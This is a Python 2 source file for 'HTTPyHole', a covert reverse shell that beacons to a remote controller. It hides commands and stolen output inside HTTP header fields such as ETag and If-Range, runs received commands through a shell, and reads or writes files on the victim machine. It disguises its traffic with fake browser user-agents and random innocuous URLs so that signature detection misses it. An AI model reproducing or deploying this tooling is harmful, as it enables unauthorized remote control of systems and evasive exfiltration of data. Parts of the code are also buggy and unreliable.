#/usr/bin/env python

#
# shell.py -- HTTPyHole shell
# Author: pasv (pasvninja [at] gmail [d0t] com
# 

# This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#



## This file will eventually be renamed HTTPyHole when it adds tunneling support and possibly AES encryption
# right now as it stands this is just alpha code


import httplib
import sys
import re
import random
import base64
import subprocess
import bz2
import time

BLOCK_SIZE = 32
INIT_CONNECTION_STRING = "737060cd8c284d8af7ad3082f209582d" # change this or randomize it if you find yourself being sig'd
CONT_CONNECTION_STRING = "227061cd8c2a4d8af7ab2132f203453a"
FINI_CONNECTION_STRING = "143061cdac2a4d8ff7ad213432cd413a"

DEFAULT_PORT = 80
MAGIC_CMD_STRING = "M4G1C"

# keeping adding to this list, consider making this a list of tuples
#  that contain both the Accept/Content-Type to pair with the file type
#  to make it look more legit..
urls = ["/images/head.gif", "/cgi-bin/page.pl", "/home/doc/index.html", "/html/redir.html", \
        "/cgi-bin/tr.cgi", "/complete/search?ix=sea&client=chrome&hl=en-US&q=ser"]

def random_url():
    # returns a randomized URL to request, makes traffic look legit
    return urls[random.randint(0,urls.__len__() - 1)]

if(__name__ == "__main__"):
    host = sys.argv[1]
    port = int(sys.argv[2])
    while 1:
        recv_size=0
        http = httplib.HTTPConnection(host, port)
        headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", \
                   "If-None-Match": INIT_CONNECTION_STRING, \
                   "Content-type": "application/x-www-form-urlencoded", \
                   "Accept": "text/plain"}
        http.request("GET", random_url(), "", headers)
        response = http.getresponse() # not really used, but tcpdump likes it
        if(response.getheader("Retry-After")):
                recv_size = int(response.getheader("Retry-After")) - 50
        print "Prepping for a recv_size of " + str(recv_size)
        recvd=0
        recv_chunks=[]
        while recv_size > recvd:
            recv_chunks.append("") # this is hackish
            headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", \
                   "If-None-Match": CONT_CONNECTION_STRING, \
                   "Content-type": "application/x-www-form-urlencoded", \
                   "Accept": "text/plain"}
            http.request("GET", random_url(), "", headers)
            print "Sent a CONT_CONNECTION_STRING"
            response = http.getresponse() # not really used, but tcpdump likes it
            if(response.getheader("ETag")):
                print "got an ETAG!"
                recv_chunks[recvd] = response.getheader("ETag")
                recvd += 1
        # put the pieces together and decode
        http.close()
        cmd = ""
        for chunk in recv_chunks:
            cmd += chunk
        cmd = base64.b64decode(cmd)
        print "Recvd cmd: " + cmd
        if(cmd.find(MAGIC_CMD_STRING) == 0):
            if(cmd[len(MAGIC_CMD_STRING):].find("DOWNLOAD")):
                filename=cmd[len(MAGIC_CMD_STRING)+len("DOWNLOAD "):]
                output=open(filename).read()
            elif(cmd[len(MAGIC_CMD_STRING):].find("UPLOAD") == 0):
                m=re.search(MAGIC_CMD_STRING+"UPLOAD (.+)" + MAGIC_CMD_STRING + "$")
                to_write = m.group(0)
                print to_write
                open("hole_ul").write(to_write)
                output = "File uploaded successfully as 'hole_ul'. *Gulp*"
        else:
            p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = p.stdout.read() + p.stderr.read()
        output = bz2.compress(output) # default compression level 9
        output = base64.b64encode(output)
        send_blocks = []
        i=0
        j=0
        for c in list(output):
            send_blocks.append("")
            if((i % BLOCK_SIZE) == 0 and i != 0):
                    j += 1
            send_blocks[j] += c 
            i += 1
        send_size = len(output) / BLOCK_SIZE
        if(len(output) % BLOCK_SIZE != 0):
            send_size = send_size + 1
        sent = 0
        # initialize the response send
        
        print "send_size:" + str(send_size)
        while sent < send_size+1:
            http = httplib.HTTPConnection(host, port)
            headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", \
                       "Max-Forwards" : send_size-sent+10, \
                       "If-Range": send_blocks[sent], \
                       "Content-type": "application/x-www-form-urlencoded", \
                       "Accept": "text/plain"}
            http.request("GET", random_url(), "", headers)
            print "Sent block: %s" % send_blocks[sent] 
            sent += 1
            #time.sleep(0.001) # necessary to not overload with http requests
            http.getresponse()
            http.close()
        print "Sent over the command encoded as " + output
        